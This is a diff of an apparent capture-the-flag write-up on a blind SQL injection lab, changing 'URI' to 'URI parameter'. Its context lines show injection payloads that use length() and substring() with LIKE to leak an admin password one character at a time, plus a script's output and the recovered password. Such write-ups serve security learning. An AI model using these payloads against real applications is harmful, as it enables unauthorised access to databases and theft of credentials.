@@ -28,7 +28,7 @@ First we have to reveal the length of the flag.
 
 ### Retrieving the password length
 
-If we provide the following URI:
+If we provide the following URI parameter:
 
 ```
 ?pw=' || id LIKE 'admin' %26%26 length(pw) LIKE 1 -- -
@@ -51,7 +51,7 @@ SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' &
 Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
 That tells us that the length of the `pw` column is more than 1.
 
-If we keep increasing the length and provide the following URI:
+If we keep increasing the length and provide the following URI parameter:
 
 ```
 ?pw=' || id LIKE 'admin' %26%26 length(pw) LIKE 8 -- -
@@ -83,7 +83,7 @@ Next, we can leak the password byte by byte using the `substr()` function.
 
 ![Pasted image 20240610125927](https://github.com/Kunull/Write-ups/assets/110326359/063e53c5-9020-42b4-b78a-40133f95d84d)
 
-If we provide the following URI:
+If we provide the following URI parameter:
 
 ```
 ?pw=' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '0' -- -
@@ -253,7 +253,7 @@ $ python .\golem_script.py.py
 [!] Final payload: ?pw=77d6290b
 ```
 
-Now, we can provide password URI:
+Now, we can provide password URI parameter:
 
 ```
 ?pw=77d6290b
